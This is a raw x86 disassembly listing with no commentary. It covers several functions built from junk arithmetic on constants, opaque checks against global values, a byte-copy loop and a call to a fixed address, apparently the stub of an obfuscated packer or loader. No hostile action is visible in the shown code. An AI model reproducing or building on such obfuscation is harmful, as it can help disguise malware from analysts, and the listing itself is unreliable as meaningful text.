  41caf6:	push   0xc9f
  41cafb:	inc    edi
  41cafc:	mov    DWORD PTR [ebp-0x4],edi
  41caff:	mov    eax,DWORD PTR [ebp-0x18]
  41cb02:	mov    ecx,DWORD PTR [ebp-0x14]
  41cb05:	push   0x1c19
  41cb0a:	push   ecx
  41cb0b:	push   eax
  41cb0c:	call   0x41e026
  41cb11:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb14:	mov    ebx,DWORD PTR [ebp-0x1c]
  41cb17:	or     eax,ecx
  41cb19:	or     edx,ebx
  41cb1b:	push   0x20fa
  41cb20:	add    eax,0x7fac
  41cb25:	push   0x1cd48ab
  41cb2a:	adc    edx,0x133b
  41cb30:	push   edx
  41cb31:	push   eax
  41cb32:	call   0x421b6b
  41cb37:	mov    ebx,DWORD PTR [ebp-0x4]
  41cb3a:	lea    ecx,[eax-0x5d40]
  41cb40:	xor    edx,edx
  41cb42:	mov    eax,0x16c2
  41cb47:	div    ebx
  41cb49:	mov    edx,DWORD PTR [ebp-0xc]
  41cb4c:	sub    eax,edx
  41cb4e:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  41cb55:	mov    DWORD PTR [ebp-0x14],0x6af0
  41cb5c:	mov    DWORD PTR [ebp-0x4],edi
  41cb5f:	mov    DWORD PTR [ebp-0xc],0x2c8a
  41cb66:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb69:	mov    eax,0x4401
  41cb6e:	sub    eax,ecx
  41cb70:	mov    ecx,DWORD PTR [ebp-0x4]
  41cb73:	xor    edx,edx
  41cb75:	div    ecx
  41cb77:	mov    ecx,DWORD PTR [ebp-0x14]
  41cb7a:	xor    eax,0xa80
  41cb7f:	or     eax,0x343b
  41cb84:	or     eax,ecx
  41cb86:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb89:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  41cb90:	mov    DWORD PTR [ebp-0xc],0x327f
  41cb97:	mov    DWORD PTR [ebp-0x14],0x5215
  41cb9e:	mov    DWORD PTR [ebp+0x8],0x2502
  41cba5:	mov    eax,DWORD PTR [ebp+0x8]
  41cba8:	add    eax,DWORD PTR [ebp-0x14]
  41cbab:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbae:	and    eax,0x2bab
  41cbb3:	lea    eax,[eax+ecx*1-0x557f]
  41cbba:	mov    ecx,DWORD PTR [ebp+0xc]
  41cbbd:	mov    DWORD PTR [esi+eax*4],ecx
  41cbc0:	mov    DWORD PTR [ebp-0xc],edi
  41cbc3:	mov    DWORD PTR [ebp+0x8],0x5f40
  41cbca:	mov    DWORD PTR [ebp-0x14],0x6ba4
  41cbd1:	mov    DWORD PTR [ebp+0xc],0x7b17
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    eax,0x43d2
  41cbe0:	sub    eax,ecx
  41cbe2:	add    eax,DWORD PTR [ebp+0xc]
  41cbe5:	xor    edx,edx
  41cbe7:	add    eax,DWORD PTR [ebp-0x14]
  41cbea:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbed:	div    ecx
  41cbef:	mov    ecx,DWORD PTR [ebp+0x10]
  41cbf2:	xor    edx,edx
  41cbf4:	pop    edi
  41cbf5:	pop    ebx
  41cbf6:	or     eax,0x67ad
  41cbfb:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  41cc02:	mov    DWORD PTR [ebp+0x10],0x517b
  41cc09:	mov    DWORD PTR [ebp+0xc],0x5d62
  41cc10:	mov    DWORD PTR [ebp+0x8],0x41b0
  41cc17:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc1a:	mov    eax,DWORD PTR [ebp+0xc]
  41cc1d:	and    ecx,0x68c1
  41cc23:	sub    ecx,0x6fd3
  41cc29:	or     ecx,eax
  41cc2b:	mov    eax,DWORD PTR [ebp+0x10]
  41cc2e:	imul   ecx,eax
  41cc31:	mov    eax,0xf52840d5
  41cc36:	div    ecx
  41cc38:	leave  
  41cc39:	ret    0xc
  41cc3c:	push   ebp
  41cc3d:	mov    ebp,esp
  41cc3f:	sub    esp,0xc0
  41cc45:	push   esi
  41cc46:	mov    DWORD PTR [ebp-0x80],0x2f93
  41cc4d:	mov    DWORD PTR [ebp-0x7c],0x3321
  41cc54:	mov    DWORD PTR [ebp-0x70],0x7d00
  41cc5b:	mov    DWORD PTR [ebp-0x6c],0xd87
  41cc62:	mov    DWORD PTR [ebp-0x60],0x4197
  41cc69:	mov    DWORD PTR [ebp-0x5c],0xa7d
  41cc70:	mov    DWORD PTR [ebp-0x50],0x772d
  41cc77:	mov    DWORD PTR [ebp-0x4c],0x37d8
  41cc7e:	mov    DWORD PTR [ebp-0x40],0x414a
  41cc85:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41cc8c:	mov    DWORD PTR [ebp-0x30],0x136b
  41cc93:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41cc9a:	mov    DWORD PTR [ebp-0x20],0x32d8
  41cca1:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41cca8:	mov    DWORD PTR [ebp-0xc],0x3956
  41ccaf:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41ccb9:	mov    DWORD PTR [ebp-0x94],0x1
  41ccc3:	mov    DWORD PTR [ebp-0x14],0x17ab
  41ccca:	mov    DWORD PTR [ebp-0x64],0x7a3d
  41ccd1:	mov    DWORD PTR [ebp-0x54],0x378a
  41ccd8:	mov    DWORD PTR [ebp-0x74],0x5a00
  41ccdf:	mov    DWORD PTR [ebp-0x24],0x1f3a
  41cce6:	mov    DWORD PTR [ebp-0x84],0x9a225
  41ccf0:	mov    DWORD PTR [ebp-0x44],0x31f8
  41ccf7:	mov    DWORD PTR [ebp-0x34],0x3663
  41ccfe:	mov    DWORD PTR [ebp-0xb4],0x3165
  41cd08:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  41cd12:	mov    DWORD PTR [ebp-0xbc],0x43cc
  41cd1c:	mov    DWORD PTR [ebp-0xb0],0x7564
  41cd26:	mov    DWORD PTR [ebp-0xac],0x18cf
  41cd30:	mov    DWORD PTR [ebp-0xa0],0x3135
  41cd3a:	mov    DWORD PTR [ebp-0x9c],0x568d
  41cd44:	mov    DWORD PTR [ebp-0x90],0x11f2
  41cd4e:	mov    DWORD PTR [ebp-0x8c],0x63ea
  41cd58:	mov    DWORD PTR [ebp-0x10],0x3066
  41cd5f:	mov    DWORD PTR [ebp-0x8],0x6ed2
  41cd66:	push   0x7e1d
  41cd6b:	mov    DWORD PTR [ebp-0x4],0x30f4
  41cd72:	mov    eax,DWORD PTR [ebp-0x20]
  41cd75:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cd78:	push   0x5380
  41cd7d:	push   ecx
  41cd7e:	push   eax
  41cd7f:	call   0x41e026
  41cd84:	mov    ecx,eax
  41cd86:	mov    eax,DWORD PTR [ebp-0x30]
  41cd89:	xor    ecx,eax
  41cd8b:	mov    esi,edx
  41cd8d:	mov    edx,DWORD PTR [ebp-0x2c]
  41cd90:	mov    eax,DWORD PTR [ebp-0x40]
  41cd93:	xor    esi,edx
  41cd95:	mov    edx,DWORD PTR [ebp-0x3c]
  41cd98:	xor    ecx,0xf3a
  41cd9e:	or     ecx,eax
  41cda0:	mov    eax,ds:0x422268
  41cda5:	mov    eax,DWORD PTR [eax+0x1d8]
  41cdab:	mov    eax,DWORD PTR [eax]
  41cdad:	xor    esi,0x6665
  41cdb3:	or     esi,edx
  41cdb5:	add    ecx,0xef6a96a5
  41cdbb:	cdq    
  41cdbc:	adc    esi,0xc8b6a000
  41cdc2:	cmp    eax,ecx
  41cdc4:	jne    0x41cdd2
  41cdca:	cmp    edx,esi
  41cdcc:	je     0x41ce31
  41cdd2:	mov    eax,DWORD PTR [ebp-0x50]
  41cdd5:	mov    ecx,DWORD PTR [ebp-0x4c]
  41cdd8:	mov    edx,DWORD PTR [ebp-0x60]
  41cddb:	mov    esi,DWORD PTR [ebp-0x5c]
  41cdde:	add    eax,0x7818
  41cde3:	adc    ecx,0x87
  41cde9:	or     eax,edx
  41cdeb:	mov    edx,DWORD PTR [ebp-0x70]
  41cdee:	or     ecx,esi
  41cdf0:	mov    esi,DWORD PTR [ebp-0x6c]
  41cdf3:	push   esi
  41cdf4:	push   edx
  41cdf5:	push   ecx
  41cdf6:	push   eax
  41cdf7:	call   0x41e026
  41cdfc:	mov    ecx,DWORD PTR [ebp-0x80]
  41cdff:	mov    esi,DWORD PTR [ebp-0x7c]
  41ce02:	and    eax,ecx
  41ce04:	mov    ecx,DWORD PTR ds:0x422268
  41ce0a:	mov    ecx,DWORD PTR [ecx+0x1d0]
  41ce10:	mov    ecx,DWORD PTR [ecx]
  41ce12:	and    edx,esi
  41ce14:	xor    eax,0x2b01
  41ce19:	xor    edx,0x2021
  41ce1f:	xor    esi,esi
  41ce21:	cmp    ecx,eax
  41ce23:	jne    0x41cf6f
  41ce29:	cmp    esi,edx
  41ce2b:	jne    0x41cf6f
  41ce31:	mov    eax,DWORD PTR [ebp-0xa4]
  41ce37:	mov    ecx,DWORD PTR [ebp-0xc]
  41ce3a:	add    eax,0x80ca
  41ce3f:	or     eax,ecx
  41ce41:	mov    ecx,DWORD PTR ds:0x422304
  41ce47:	or     eax,0x686
  41ce4c:	xor    eax,0x3eec
  41ce51:	lea    eax,[eax+ecx*1-0xc11b]
  41ce58:	xor    DWORD PTR ds:0x4222fc,eax
  41ce5e:	mov    eax,DWORD PTR [ebp-0x64]
  41ce61:	and    eax,0x4dff
  41ce66:	add    eax,DWORD PTR [ebp-0x14]
  41ce69:	mov    ecx,DWORD PTR [ebp-0x94]
  41ce6f:	xor    eax,0x676c
  41ce74:	xor    edx,edx
  41ce76:	div    ecx
  41ce78:	mov    ecx,DWORD PTR [ebp-0x24]
  41ce7b:	mov    edx,DWORD PTR [ebp-0x74]
  41ce7e:	xor    ecx,0x6e1e
  41ce84:	imul   ecx,edx
  41ce87:	mov    edx,DWORD PTR [ebp+0x8]
  41ce8a:	push   0x4
  41ce8c:	push   0xe4c37b20
  41ce91:	xor    eax,0x3884
  41ce96:	mov    eax,DWORD PTR [eax+edx*1]
  41ce99:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  41cea0:	mov    eax,DWORD PTR [ebp-0x34]
  41cea3:	mov    edx,DWORD PTR [ebp-0xb4]
  41cea9:	lea    eax,[edx+eax*1-0x76d2]
  41ceb0:	mov    edx,DWORD PTR [ebp-0x44]
  41ceb3:	mov    esi,DWORD PTR [ebp-0x84]
  41ceb9:	or     eax,edx
  41cebb:	xor    edx,edx
  41cebd:	div    esi
  41cebf:	mov    edx,DWORD PTR [ebp-0x54]
  41cec2:	add    eax,0x43d7
  41cec7:	xor    eax,0x5e6a
  41cecc:	add    eax,DWORD PTR [edx+ecx*1]
  41cecf:	mov    ecx,DWORD PTR ds:0x4222fc
  41ced5:	add    DWORD PTR [eax],ecx
  41ced7:	mov    eax,DWORD PTR [ebp-0x90]
  41cedd:	mov    ecx,DWORD PTR [ebp-0x8c]
  41cee3:	mov    edx,DWORD PTR [ebp-0xa0]
  41cee9:	mov    esi,DWORD PTR [ebp-0x9c]
  41ceef:	sub    edx,eax
  41cef1:	mov    eax,DWORD PTR [ebp-0xb0]
  41cef7:	sbb    esi,ecx
  41cef9:	mov    ecx,DWORD PTR [ebp-0xac]
  41ceff:	xor    edx,eax
  41cf01:	mov    eax,DWORD PTR [ebp-0xc0]
  41cf07:	xor    esi,ecx
  41cf09:	mov    ecx,DWORD PTR [ebp-0xbc]
  41cf0f:	add    edx,eax
  41cf11:	adc    esi,ecx
  41cf13:	add    edx,0x2313
  41cf19:	adc    esi,0x2a00
  41cf1f:	push   esi
  41cf20:	push   edx
  41cf21:	call   0x421b6b
  41cf26:	mov    ecx,0x1207
  41cf2b:	sub    ecx,eax
  41cf2d:	push   0x0
  41cf2f:	pop    eax
  41cf30:	sbb    eax,edx
  41cf32:	mov    edx,DWORD PTR ds:0x4222fc
  41cf38:	xor    esi,esi
  41cf3a:	cmp    edx,ecx
  41cf3c:	jne    0x41cf6f
  41cf42:	cmp    esi,eax
  41cf44:	jne    0x41cf6f
  41cf4a:	mov    eax,DWORD PTR [ebp-0x4]
  41cf4d:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf50:	add    eax,0x4296
  41cf55:	shr    eax,0x2
  41cf58:	or     eax,ecx
  41cf5a:	mov    ecx,DWORD PTR [ebp-0x10]
  41cf5d:	xor    eax,ecx
  41cf5f:	xor    eax,0x4e94
  41cf64:	add    eax,DWORD PTR ds:0x4222fc
  41cf6a:	mov    ds:0x422304,eax
  41cf6f:	pop    esi
  41cf70:	leave  
  41cf71:	ret    0x4
  41cf74:	push   ebp
  41cf75:	mov    ebp,esp
  41cf77:	sub    esp,0x58
  41cf7a:	push   ebx
  41cf7b:	push   esi
  41cf7c:	push   edi
  41cf7d:	mov    DWORD PTR [ebp-0x58],0x3082
  41cf84:	mov    DWORD PTR [ebp-0x54],0x37a2
  41cf8b:	mov    DWORD PTR [ebp-0x50],0x49d6
  41cf92:	mov    DWORD PTR [ebp-0x4c],0x6390
  41cf99:	mov    DWORD PTR [ebp-0x48],0x40f2
  41cfa0:	mov    DWORD PTR [ebp-0x44],0x21d4
  41cfa7:	mov    DWORD PTR [ebp-0x28],0x4726
  41cfae:	mov    DWORD PTR [ebp-0x24],0x221a
  41cfb5:	mov    DWORD PTR [ebp-0x30],0x768c
  41cfbc:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41cfc3:	mov    DWORD PTR [ebp-0x40],0x6cf6
  41cfca:	mov    DWORD PTR [ebp-0x3c],0x94c
  41cfd1:	mov    DWORD PTR [ebp-0x38],0x4797
  41cfd8:	mov    DWORD PTR [ebp-0x34],0x4439
  41cfdf:	mov    DWORD PTR [ebp-0x20],0x2531
  41cfe6:	mov    esi,0x5a3e
  41cfeb:	mov    DWORD PTR [ebp-0x1c],esi
  41cfee:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  41cff5:	mov    DWORD PTR [ebp-0x14],0x7
  41cffc:	mov    DWORD PTR [ebp-0x10],0xe3a
  41d003:	mov    DWORD PTR [ebp-0xc],0x6a6e
  41d00a:	mov    DWORD PTR [ebp-0x8],0x6b99
  41d011:	mov    DWORD PTR [ebp-0x4],0x2acd
  41d018:	mov    eax,DWORD PTR [ebp-0x10]
  41d01b:	mov    ecx,DWORD PTR [ebp-0xc]
  41d01e:	mov    eax,DWORD PTR [ebp-0x8]
  41d021:	mov    ecx,DWORD PTR [ebp-0x4]
  41d024:	mov    eax,DWORD PTR [ebp-0x18]
  41d027:	mov    ecx,DWORD PTR [ebp-0x14]
  41d02a:	mov    eax,DWORD PTR [ebp-0x8]
  41d02d:	mov    ecx,DWORD PTR [ebp-0x4]
  41d030:	mov    edx,DWORD PTR [ebp-0x10]
  41d033:	mov    edi,DWORD PTR [ebp-0xc]
  41d036:	add    eax,edx
  41d038:	mov    edx,DWORD PTR [ebp-0x18]
  41d03b:	adc    ecx,edi
  41d03d:	mov    edi,DWORD PTR [ebp-0x14]
  41d040:	push   edi
  41d041:	push   edx
  41d042:	or     ecx,0x6833
  41d048:	or     eax,0x6b80
  41d04d:	push   ecx
  41d04e:	push   eax
  41d04f:	call   0x421b6b
  41d054:	mov    ecx,DWORD PTR [ebp-0x20]
  41d057:	mov    edi,DWORD PTR [ebp-0x1c]
  41d05a:	and    eax,0x25cb
  41d05f:	or     eax,ecx
  41d061:	mov    ecx,DWORD PTR [ebp-0x20]
  41d064:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d067:	and    edx,0x76f2
  41d06d:	or     edx,edi
  41d06f:	xor    edx,esi
  41d071:	xor    eax,0x253b
  41d076:	shld   edx,eax,0x2
  41d07a:	shl    eax,0x2
  41d07d:	shr    ecx,0x1e
  41d080:	xor    esi,esi
  41d082:	or     eax,ecx
  41d084:	or     edx,esi
  41d086:	mov    edi,0xba699573
  41d08b:	xor    eax,edi
  41d08d:	mov    DWORD PTR [ebp-0x20],eax
  41d090:	mov    esi,0x9c0a89d8
  41d095:	xor    edx,esi
  41d097:	mov    DWORD PTR [ebp-0x1c],edx
  41d09a:	mov    eax,DWORD PTR [ebp-0x38]
  41d09d:	mov    ecx,DWORD PTR [ebp-0x34]
  41d0a0:	mov    edx,DWORD PTR [ebp-0x40]
  41d0a3:	mov    ebx,DWORD PTR [ebp-0x3c]
  41d0a6:	push   ebx
  41d0a7:	push   edx
  41d0a8:	push   ecx
  41d0a9:	push   eax
  41d0aa:	call   0x41e026
  41d0af:	add    eax,0x536a
  41d0b4:	adc    edx,0x9573
  41d0ba:	push   0x12613
  41d0bf:	push   0xae21daec
  41d0c4:	push   edx
  41d0c5:	push   eax
  41d0c6:	call   0x421b6b
  41d0cb:	mov    ecx,eax
  41d0cd:	mov    eax,DWORD PTR [ebp-0x20]
  41d0d0:	mov    ebx,DWORD PTR [ebp-0x1c]
  41d0d3:	xor    ecx,0x1b8b
  41d0d9:	xor    edx,0x0
  41d0dc:	add    ecx,eax
  41d0de:	mov    eax,DWORD PTR [ebp+0xc]
  41d0e1:	adc    edx,ebx
  41d0e3:	mov    DWORD PTR [eax],ecx
  41d0e5:	mov    DWORD PTR [eax+0x4],edx
  41d0e8:	mov    eax,DWORD PTR [ebp-0x30]
  41d0eb:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d0ee:	mov    edx,0xbdb2
  41d0f3:	sub    edx,eax
  41d0f5:	mov    eax,DWORD PTR [ebp-0x28]
  41d0f8:	mov    ebx,0x4c02
  41d0fd:	sbb    ebx,ecx
  41d0ff:	mov    ecx,DWORD PTR [ebp-0x24]
  41d102:	sub    edx,eax
  41d104:	mov    eax,DWORD PTR [ebp+0xc]
  41d107:	sbb    ebx,ecx
  41d109:	add    edx,DWORD PTR [eax]
  41d10b:	mov    ecx,DWORD PTR [ebp-0x28]
  41d10e:	adc    ebx,DWORD PTR [eax+0x4]
  41d111:	push   0x2
  41d113:	xor    ebx,esi
  41d115:	mov    esi,DWORD PTR [ebp-0x24]
  41d118:	pop    esi
  41d119:	sub    esi,ecx
  41d11b:	mov    ecx,DWORD PTR [ebp-0x30]
  41d11e:	sub    esi,ecx
  41d120:	xor    edx,edi
  41d122:	mov    edi,DWORD PTR [ebp-0x2c]
  41d125:	mov    ecx,DWORD PTR [ebp+0xc]
  41d128:	add    esi,DWORD PTR [ecx]
  41d12a:	mov    eax,ebx
  41d12c:	shrd   edx,eax,0x2
  41d130:	xor    ecx,ecx
  41d132:	shl    esi,0x1e
  41d135:	shr    eax,0x2
  41d138:	or     ecx,edx
  41d13a:	xor    esi,0xc0000000
  41d140:	or     esi,eax
  41d142:	mov    DWORD PTR [ebp-0x40],ecx
  41d145:	push   0x0
  41d147:	mov    DWORD PTR [ebp-0x3c],esi
  41d14a:	mov    eax,DWORD PTR [ebp-0x48]
  41d14d:	mov    ecx,DWORD PTR [ebp-0x44]
  41d150:	push   0xae0404d3
  41d155:	push   ecx
  41d156:	push   eax
  41d157:	call   0x421b6b
  41d15c:	mov    ecx,eax
  41d15e:	mov    eax,DWORD PTR [ebp-0x50]
  41d161:	mov    esi,DWORD PTR [ebp-0x4c]
  41d164:	or     ecx,eax
  41d166:	mov    eax,DWORD PTR [ebp-0x40]
  41d169:	or     edx,esi
  41d16b:	mov    esi,DWORD PTR [ebp-0x3c]
  41d16e:	add    ecx,eax
  41d170:	mov    eax,DWORD PTR [ebp-0x58]
  41d173:	adc    edx,esi
  41d175:	mov    esi,DWORD PTR [ebp-0x54]
  41d178:	add    ecx,eax
  41d17a:	mov    eax,DWORD PTR [ebp+0x8]
  41d17d:	adc    edx,esi
  41d17f:	add    ecx,0xffff55a8
  41d185:	pop    edi
  41d186:	adc    edx,0xffff64cd
  41d18c:	pop    esi
  41d18d:	mov    DWORD PTR [eax],ecx
  41d18f:	mov    DWORD PTR [eax+0x4],edx
  41d192:	pop    ebx
  41d193:	leave  
  41d194:	ret    0x8
  41d197:	push   ebp
  41d198:	mov    ebp,esp
  41d19a:	sub    esp,0x3c
  41d19d:	mov    DWORD PTR [ebp-0x20],0x3510
  41d1a4:	mov    DWORD PTR [ebp-0x1c],0x2104
  41d1ab:	mov    DWORD PTR [ebp-0x18],0x5d15
  41d1b2:	mov    DWORD PTR [ebp-0x14],0x30cd
  41d1b9:	mov    DWORD PTR [ebp-0x10],0x1709
  41d1c0:	mov    DWORD PTR [ebp-0xc],0x260b
  41d1c7:	mov    DWORD PTR [ebp-0x8],0x3204
  41d1ce:	mov    DWORD PTR [ebp-0x4],0x62ea
  41d1d5:	mov    DWORD PTR [ebp-0x38],0x58e9
  41d1dc:	mov    DWORD PTR [ebp-0x34],0x7f89
  41d1e3:	mov    DWORD PTR [ebp-0x30],0x7fda
  41d1ea:	mov    DWORD PTR [ebp-0x2c],0x2889
  41d1f1:	mov    DWORD PTR [ebp-0x28],0xf0f
  41d1f8:	mov    DWORD PTR [ebp-0x24],0x58e1
  41d1ff:	mov    DWORD PTR [ebp-0x3c],0x69c
  41d206:	mov    eax,DWORD PTR [ebp-0x10]
  41d209:	mov    ecx,DWORD PTR [ebp-0x14]
  41d20c:	and    al,0xb9
  41d20e:	add    al,cl
  41d210:	mov    ecx,DWORD PTR [ebp-0x18]
  41d213:	and    al,cl
  41d215:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d218:	sub    al,0x11
  41d21a:	and    al,cl
  41d21c:	mov    ecx,DWORD PTR [ebp-0x20]
  41d21f:	mov    edx,DWORD PTR [ebp+0x8]
  41d222:	imul   ecx,ecx,0x6008
  41d228:	add    ecx,0x1759dd6e
  41d22e:	add    al,0x4d
  41d230:	xor    ecx,0x2b4185ee
  41d236:	cmp    BYTE PTR [ecx+edx*1],al
  41d239:	jne    0x41d2d3
  41d23f:	mov    ecx,DWORD PTR [ebp-0x4]
  41d242:	mov    eax,0xffffeff8
  41d247:	mov    edx,eax
  41d249:	sub    edx,ecx
  41d24b:	add    edx,DWORD PTR [ebp-0x8]
  41d24e:	mov    ecx,DWORD PTR [ebp-0xc]
  41d251:	or     edx,ecx
  41d253:	mov    ecx,DWORD PTR [ebp-0x4]
  41d256:	imul   edx,edx,0x85300
  41d25c:	sub    eax,ecx
  41d25e:	add    eax,DWORD PTR [ebp-0x8]
  41d261:	mov    ecx,DWORD PTR [ebp-0xc]
  41d264:	or     eax,ecx
  41d266:	mov    ecx,DWORD PTR [ebp+0x8]
  41d269:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  41d270:	add    eax,0x40e5
  41d275:	imul   eax,eax,0x214c
  41d27b:	add    eax,ecx
  41d27d:	mov    ecx,DWORD PTR [ebp+0x8]
  41d280:	add    ecx,eax
  41d282:	mov    DWORD PTR [ebp+0x8],ecx
  41d285:	mov    eax,DWORD PTR [ebp-0x24]
  41d288:	mov    ecx,DWORD PTR [ebp-0x28]
  41d28b:	and    eax,ecx
  41d28d:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d290:	and    eax,ecx
  41d292:	mov    ecx,DWORD PTR [ebp-0x30]
  41d295:	imul   eax,ecx
  41d298:	mov    ecx,DWORD PTR [ebp-0x34]
  41d29b:	or     eax,ecx
  41d29d:	mov    ecx,DWORD PTR [ebp-0x38]
  41d2a0:	imul   eax,ecx
  41d2a3:	mov    ecx,DWORD PTR [ebp+0x8]
  41d2a6:	sub    eax,0x777ea653
  41d2ab:	cmp    DWORD PTR [ecx+0x54],eax
  41d2ae:	je     0x41d2bc
  41d2b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d2b7:	jmp    0x41d303
  41d2bc:	mov    eax,DWORD PTR [ebp-0x3c]
  41d2bf:	sub    eax,0x5258
  41d2c4:	xor    eax,0x49e9
  41d2c9:	add    eax,0x253
  41d2ce:	jmp    0x41d303
  41d2d3:	mov    DWORD PTR [ebp-0x3c],0x4177
  41d2da:	mov    DWORD PTR [ebp+0x8],0x1405
  41d2e1:	mov    eax,DWORD PTR [ebp+0x8]
  41d2e4:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d2e7:	imul   eax,eax,0x58cc
  41d2ed:	add    eax,0x3f39
  41d2f2:	and    eax,ecx
  41d2f4:	add    eax,0x3b90
  41d2f9:	or     eax,0x4b1c
  41d2fe:	sub    eax,0x7fdd
  41d303:	leave  
  41d304:	ret    0x4
  41d307:	push   ebp
  41d308:	mov    ebp,esp
  41d30a:	and    esp,0xfffffff8
  41d30d:	sub    esp,0x20
  41d310:	push   ebx
  41d311:	push   esi
  41d312:	lea    eax,[esp+0x10]
  41d316:	mov    DWORD PTR [esp+0xc],eax
  41d31a:	mov    eax,DWORD PTR [esp+0xc]
  41d31e:	mov    ecx,DWORD PTR [esp+0x10]
  41d322:	mov    edx,DWORD PTR [esp+0x14]
  41d326:	sub    DWORD PTR [eax],ecx
  41d328:	sbb    DWORD PTR [eax+0x4],edx
  41d32b:	mov    eax,DWORD PTR [esp+0xc]
  41d32f:	or     DWORD PTR [eax],0xba6d9573
  41d335:	or     DWORD PTR [eax+0x4],0x9c0a89d8
  41d33c:	lea    eax,[esp+0x18]
  41d340:	push   eax
  41d341:	lea    eax,[esp+0x24]
  41d345:	push   eax
  41d346:	call   0x41cf74
  41d34b:	mov    eax,DWORD PTR [esp+0x18]
  41d34f:	mov    ecx,DWORD PTR [esp+0x1c]
  41d353:	push   DWORD PTR [ebp+0x18]
  41d356:	mov    ebx,DWORD PTR [ebp+0xc]
  41d359:	push   DWORD PTR [ebp+0x14]
  41d35c:	mov    esi,DWORD PTR [ebp+0x8]
  41d35f:	push   DWORD PTR [ebp+0x10]
  41d362:	push   DWORD PTR [esp+0x20]
  41d366:	push   DWORD PTR [esp+0x20]
  41d36a:	push   DWORD PTR [esp+0x38]
  41d36e:	push   DWORD PTR [esp+0x38]
  41d372:	call   0x401000
  41d377:	pop    esi
  41d378:	pop    ebx
  41d379:	mov    esp,ebp
  41d37b:	pop    ebp
  41d37c:	ret    0x14
  41d37f:	push   ebp
  41d380:	mov    ebp,esp
  41d382:	sub    esp,0x28
  41d385:	push   ebx
  41d386:	push   esi
  41d387:	push   edi
  41d388:	mov    DWORD PTR [ebp-0x10],0x6b3
  41d38f:	mov    DWORD PTR [ebp-0xc],0x816
  41d396:	mov    DWORD PTR [ebp-0x8],0x248f
  41d39d:	mov    DWORD PTR [ebp-0x20],0x4ef0
  41d3a4:	mov    DWORD PTR [ebp-0x1c],0x647f
  41d3ab:	mov    DWORD PTR [ebp-0x4],0x2
  41d3b2:	mov    DWORD PTR [ebp-0x18],0x21b3
  41d3b9:	mov    DWORD PTR [ebp-0x14],0x7c
  41d3c0:	mov    DWORD PTR [ebp-0x28],0x77e3
  41d3c7:	mov    DWORD PTR [ebp-0x24],0x2866
  41d3ce:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3d1:	xor    edx,edx
  41d3d3:	mov    eax,0x723d
  41d3d8:	div    ecx
  41d3da:	mov    esi,0xffff8748
  41d3df:	mov    edi,0x7929
  41d3e4:	mov    ecx,eax
  41d3e6:	mov    eax,DWORD PTR [ebp-0x1c]
  41d3e9:	imul   ecx,eax
  41d3ec:	mov    eax,DWORD PTR [ebp-0x20]
  41d3ef:	imul   ecx,ecx,0x758c
  41d3f5:	xor    ecx,0x3583
  41d3fb:	or     ecx,eax
  41d3fd:	mov    eax,DWORD PTR [ebp-0x8]
  41d400:	mov    edx,DWORD PTR [ebp-0xc]
  41d403:	xor    eax,edx
  41d405:	mov    edx,DWORD PTR [ebp-0x10]
  41d408:	and    eax,edx
  41d40a:	sub    eax,0x2ff7
  41d40f:	xor    eax,0x53d2
  41d414:	xor    edx,edx
  41d416:	add    ecx,0x5a905891
  41d41c:	div    esi
  41d41e:	mov    esi,0x564d
  41d423:	jmp    0x41d4b4
  41d428:	mov    DWORD PTR [ebp-0x4],0x3574
  41d42f:	mov    ebx,DWORD PTR [ebp+0xc]
  41d432:	mov    DWORD PTR [ebp-0x1c],0x4b01
  41d439:	mov    DWORD PTR [ebp-0x20],0x7c1
  41d440:	mov    eax,DWORD PTR [ebp-0x20]
  41d443:	mov    edx,DWORD PTR [ebp-0x1c]
  41d446:	or     eax,0x4cf5
  41d44b:	xor    eax,edx
  41d44d:	mov    edx,DWORD PTR [ebp-0x4]
  41d450:	sub    eax,edx
  41d452:	xor    eax,0x2ec2
  41d457:	mov    edx,ecx
  41d459:	sub    edx,eax
  41d45b:	sub    edx,0x564a
  41d461:	mov    DWORD PTR [ebp-0x4],edx
  41d464:	mov    eax,DWORD PTR [ebp-0x4]
  41d467:	mov    edx,DWORD PTR [ebp-0x4]
  41d46a:	mov    dl,BYTE PTR [edx+ebx*1]
  41d46d:	mov    ebx,DWORD PTR [ebp+0x8]
  41d470:	mov    BYTE PTR [eax+ebx*1],dl
  41d473:	mov    eax,DWORD PTR [ebp-0x24]
  41d476:	mov    edx,DWORD PTR [ebp-0x28]
  41d479:	imul   eax,edx
  41d47c:	imul   eax,eax,0x24ef285a
  41d482:	sub    eax,0x1e23
  41d487:	imul   eax,eax,0x1ef9
  41d48d:	xor    eax,0xb5479168
  41d492:	add    ecx,eax
  41d494:	mov    eax,DWORD PTR [ebp-0x8]
  41d497:	mov    edx,DWORD PTR [ebp-0xc]
  41d49a:	xor    eax,edx
  41d49c:	mov    edx,DWORD PTR [ebp-0x10]
  41d49f:	and    eax,edx
  41d4a1:	sub    eax,0x2ff7
  41d4a6:	xor    eax,0x53d2
  41d4ab:	xor    edx,edx
  41d4ad:	mov    ebx,0xffff8748
  41d4b2:	div    ebx
  41d4b4:	mov    edx,DWORD PTR [ebp+0x10]
  41d4b7:	sub    edx,eax
  41d4b9:	mov    eax,DWORD PTR [ebp-0x14]
